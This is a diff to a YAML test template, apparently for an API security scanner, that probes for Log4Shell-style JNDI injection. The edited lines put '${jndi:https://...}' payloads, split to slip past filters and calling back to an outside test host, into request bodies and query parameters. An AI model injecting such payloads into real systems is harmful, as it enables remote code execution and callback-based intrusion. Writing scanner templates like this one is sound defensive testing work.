@@ -27,7 +27,9 @@ info:
   cve:
     - CVE-2020-24008
     - CVE-2021-45901
-
+wordLists:
+  jndi1:
+  - $
 api_selection_filters:
   response_code:
     gte: 200
@@ -81,14 +83,14 @@ execute:
   requests:
   - req:
     - send_ssrf_req:
-        url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+        url: "https://test-services.akto.io/store_uuid/3523ddf7-51ef-462b-a452-f33246aae6bb"
     - modify_body_param:
-        bodyKey: "${jndi:https://test-services.akto.io/store_uuid/${random_uuid}}"
+        bodyKey: "${jndi1}{jndi:https://test-services.akto.io/3523ddf7-51ef-462b-a452-f33246aae6bb}"
     - modify_query_param:
-        queryKey: "${jndi:https://test-services.akto.io/store_uuid/${random_uuid}}"
+        queryKey: "${jndi1}{jndi:https://test-services.akto.io/3523ddf7-51ef-462b-a452-f33246aae6bb}"
         
 validate:
   response_payload:
     length:
       gt: 0
-  ssrf_url_hit: ${random_uuid}
+  ssrf_url_hit: "3523ddf7-51ef-462b-a452-f33246aae6bb"
